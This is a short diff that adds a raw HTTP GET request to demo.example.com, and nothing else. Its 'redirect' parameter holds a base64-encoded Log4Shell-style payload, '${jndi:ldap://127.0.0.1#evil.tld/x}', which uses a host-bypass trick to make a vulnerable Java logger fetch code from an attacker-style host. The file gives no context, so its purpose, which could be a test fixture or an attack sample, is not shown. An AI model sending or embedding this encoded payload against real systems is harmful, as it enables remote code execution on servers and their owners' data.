@@ -1,0 +1,4 @@
+GET /a?redirect=JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjEjZXZpbC50bGQveH0%3D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
